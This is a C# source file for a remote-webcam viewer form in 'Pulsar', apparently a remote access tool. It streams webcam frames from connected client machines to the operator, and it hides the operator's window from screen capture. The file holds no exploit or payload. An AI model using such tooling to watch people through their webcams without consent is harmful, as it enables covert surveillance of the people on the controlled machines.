using Gma.System.MouseKeyHook;
using Pulsar.Common.Messages;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using Pulsar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmRemoteWebcam : Form
    {
        /// <summary>
        /// The client which can be used for the remote webcam.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly RemoteWebcamHandler _RemoteWebcamHandler;

        /// <summary>
        /// Holds the opened remote webcam form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmRemoteWebcam> OpenedForms = new Dictionary<Client, FrmRemoteWebcam>();

        /// <summary>
        /// Creates a new remote webcam form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the remote webcam form.</param>
        /// <returns>
        /// Returns a new remote webcam form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmRemoteWebcam CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmRemoteWebcam r = new FrmRemoteWebcam(client);
            r.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, r);
            return r;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmRemoteWebcam"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the remote webcam form.</param>
        public FrmRemoteWebcam(Client client)
        {
            _connectClient = client;
            _RemoteWebcamHandler = new RemoteWebcamHandler(client);

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        /// <summary>
        /// Registers the remote webcam message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _RemoteWebcamHandler.DisplaysChanged += DisplaysChanged;
            _RemoteWebcamHandler.ProgressChanged += UpdateImage;
            MessageHandler.Register(_RemoteWebcamHandler);
        }

        /// <summary>
        /// Unregisters the remote webcam message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_RemoteWebcamHandler);
            _RemoteWebcamHandler.DisplaysChanged -= DisplaysChanged;
            _RemoteWebcamHandler.ProgressChanged -= UpdateImage;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Subscribes to local mouse and keyboard events for remote webcam input.
        /// </summary>
        private void SubscribeEvents()
        {
        }

        /// <summary>
        /// Unsubscribes from local mouse and keyboard events.
        /// </summary>
        private void UnsubscribeEvents()
        {
        }

        /// <summary>
        /// Starts the remote webcam stream and begin to receive webcam frames.
        /// </summary>
        private void StartStream()
        {
            ToggleConfigurationControls(true);

            picWebcam.Start();
            // Subscribe to the new frame counter.
            picWebcam.SetFrameUpdatedEvent(frameCounter_FrameUpdated);

            this.ActiveControl = picWebcam;

            _RemoteWebcamHandler.BeginReceiveFrames(barQuality.Value, cbMonitors.SelectedIndex);
        }

        /// <summary>
        /// Stops the remote desktop stream.
        /// </summary>
        private void StopStream()
        {
            ToggleConfigurationControls(false);

            picWebcam.Stop();
            // Unsubscribe from the frame counter. It will be re-created when starting again.
            picWebcam.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);

            this.ActiveControl = picWebcam;

            _RemoteWebcamHandler.EndReceiveFrames();
        }

        /// <summary>
        /// Toggles the activatability of configuration controls in the status/configuration panel.
        /// </summary>
        /// <param name="started">When set to <code>true</code> the configuration controls get enabled, otherwise they get disabled.</param>
        private void ToggleConfigurationControls(bool started)
        {
            btnStart.Enabled = !started;
            btnStop.Enabled = started;
            barQuality.Enabled = !started;
            cbMonitors.Enabled = !started;
        }

        /// <summary>
        /// Toggles the visibility of the status/configuration panel.
        /// </summary>
        /// <param name="visible">Decides if the panel should be visible.</param>
        private void TogglePanelVisibility(bool visible)
        {
            panelTop.Visible = visible;
            btnShow.Visible = !visible;
            this.ActiveControl = picWebcam;
        }

        /// <summary>
        /// Called whenever the remote displays changed.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="displays">The currently available displays.</param>
        private void DisplaysChanged(object sender, string[] displays)
        {
            if (displays == null || displays.Length == 0)
            {
                MessageBox.Show("No remote display detected.\nPlease wait till the client sends a list with available displays.",
                    "Display change failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            cbMonitors.Items.Clear();
            for (int i = 0; i < displays.Length; i++)
                cbMonitors.Items.Add($"Display {displays[i]}");
            cbMonitors.SelectedIndex = 0;
        }

        /// <summary>
        /// Updates the current webcam image by drawing it to the webcam picturebox.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="bmp">The new webcam image to draw.</param>
        private void UpdateImage(object sender, Bitmap bmp)
        {
            picWebcam.UpdateImage(bmp, false);
        }

        private void FrmRemoteWebcam_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Webcam", _connectClient);

            OnResize(EventArgs.Empty); // trigger resize event to align controls 

            _RemoteWebcamHandler.RefreshDisplays();
        }
        
        /// <summary>
        /// Updates the title with the current frames per second.
        /// </summary>
        /// <param name="e">The new frames per second.</param>
        private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            float fpsToShow = _RemoteWebcamHandler.CurrentFps > 0 ? _RemoteWebcamHandler.CurrentFps : e.CurrentFramesPerSecond;
            this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Webcam", _connectClient), fpsToShow.ToString("0.00"));
        }

        private void FrmRemoteWebcam_FormClosing(object sender, FormClosingEventArgs e)
        {
            // all cleanup logic goes here
            UnsubscribeEvents();
            if (_RemoteWebcamHandler.IsStarted) StopStream();
            UnregisterMessageHandler();
            _RemoteWebcamHandler.Dispose();
            picWebcam.Image?.Dispose();
        }

        private void FrmRemoteWebcam_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
                return;

            _RemoteWebcamHandler.LocalResolution = picWebcam.Size;
            btnShow.Left = (this.Width - btnShow.Width) / 2;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbMonitors.Items.Count == 0)
            {
                MessageBox.Show("No remote display detected.\nPlease wait till the client sends a list with available displays.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            SubscribeEvents();
            StartStream();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            UnsubscribeEvents();
            StopStream();
        }

        #region Remote Desktop Configuration

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
                lblQualityShow.Text += " (low)";
            else if (value >= 85)
                lblQualityShow.Text += " (best)";
            else if (value >= 75)
                lblQualityShow.Text += " (high)";
            else if (value >= 25)
                lblQualityShow.Text += " (mid)";

            this.ActiveControl = picWebcam;
        }

        #endregion

        private void btnHide_Click(object sender, EventArgs e)
        {
            TogglePanelVisibility(false);
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            TogglePanelVisibility(true);
        }
    }
}
